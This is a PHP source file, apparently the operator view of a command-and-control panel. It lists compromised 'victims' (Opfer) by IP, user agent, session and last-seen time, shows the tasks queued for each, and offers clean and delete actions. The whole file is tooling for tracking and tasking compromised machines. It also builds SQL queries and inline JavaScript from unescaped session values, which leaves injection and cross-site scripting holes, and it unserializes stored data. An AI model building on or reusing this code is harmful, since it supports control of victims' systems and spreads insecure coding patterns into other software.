<?

	$t = time() - (60*60);
	//mysqli_query($con, "DELETE u FROM user u JOIN(SELECT session FROM user v GROUP BY session HAVING COUNT(session) < 20) sub ON sub.session = u.session") or die(mysqli_error($con));

	$victims = mysqli_query($con, "SELECT MAX(time) as time, session, ip, agent, do_ FROM user GROUP BY session ORDER BY time DESC");
	$victims_anzahl = mysqli_num_rows($victims);
	if($victims_anzahl <= 0)
	{
		echo '<span style="color:red;font-weight:bold;">Es sind im Moment noch keine Opfer erfasst.</span>';
	}else{

		echo "<table class=\"sortme\">";
		echo "<tr>\n<th>IP</th><th>Zuletzt gesehen</th><th>Aufgaben</th><th>Kommentar</th><th>Agent</th><th class=\"no_sort\">Session</th><th class=\"no_sort\">Aufr&auml;umen</th><th class=\"no_sort\">Entfernen</th>\n</tr>\n";
		while($row = mysqli_fetch_object($victims)){
			$do = $row->do_;
			$do_string = "";
			if($do == "wait")
				$do_string = "wait";
			else if($do == "" || $do == false)
				$do_string = "wait";
			else{
				foreach(unserialize($do) as $key => $val){
					$do_string .= $val." - ";
				}
			}
			$sess = $row->session;
			$onclick =  " onclick=\"javascript:window.location='./index.php?detail=".$sess."'\"";
			$style = "";
			if(isset($_GET["was"]) && strlen($_GET["was"]) >= 26)
				$style = ($_GET["was"] == $sess) ? " was" : "";
			$style = ($_SERVER["REMOTE_ADDR"] == $row->ip) ? " active" : $style;
			

			$c = mysqli_query($con, "SELECT * FROM comments WHERE session = '".$sess."' ORDER BY time DESC LIMIT 1");
			$comm = (mysqli_num_rows($c) == 1) ? mysqli_fetch_object($c)->comment : "";
			
			echo "<tr class=\"button".$style."\">\n";
			echo "<td".$onclick.">".$row->ip."</td>";
			echo "<td".$onclick." my_key=\"".$row->time."\">".difference($row->time)." -- ".date("d.m.y - H:i:s", $row->time)."</td>";
			echo "<td".$onclick.">".$do_string."</td>";
			echo "<td".$onclick.">".$comm."</td>";
			echo "<td".$onclick.">".$row->agent."</td>";
			echo "<td".$onclick.">".$sess."</td>";
			echo "<td class=\"settings\" onclick=\"javascript:if(confirm(unescape('Session \'".$sess."\' aufr%E4umen?')) == true){window.location='./index.php?clean=".$sess."'}\"></td>";
			echo "<td class=\"redbg button\" onclick=\"javascript:if(confirm('Session \'".$sess."\' entfernen?') == true){window.location='./index.php?delete=".$sess."'}\"></td>\n";
			echo "</tr>\n";
		}
		echo "</table>\n";
		
		mysqli_free_result($victims);
	}
	
?>